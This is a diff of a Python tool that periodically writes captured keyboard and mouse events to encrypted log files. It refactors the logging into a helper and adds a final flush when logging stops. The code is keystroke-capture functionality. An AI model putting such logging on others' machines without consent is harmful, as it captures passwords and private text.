@@ -166,24 +166,24 @@ def keyword_stopper(stopkw):
                 break
 
 
+def log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt):
+    log_events_to_file(
+        keyboard_log_file, key,
+        partial(get_events, KEYBOARD_EVENTS, keyboard_event_to_dict), encrypt,
+        decrypt)
+    log_events_to_file(
+        mouse_log_file, key,
+        partial(get_events, MOUSE_EVENTS, mouse_event_to_dict), encrypt,
+        decrypt)
+
+
 def start_logging(keyboard_log_file, mouse_log_file, key, encrypt, decrypt,
                   interval):
     global STOP_EVENT
     while not STOP_EVENT.wait(interval):
-        log_events_to_file(
-            keyboard_log_file,
-            key,
-            partial(get_events, KEYBOARD_EVENTS, keyboard_event_to_dict),
-            encrypt,
-            decrypt
-        )
-        log_events_to_file(
-            mouse_log_file,
-            key,
-            partial(get_events, MOUSE_EVENTS, mouse_event_to_dict),
-            encrypt,
-            decrypt
-        )
+        log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt)
+
+    log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt)
 
 
 def check_args(args):
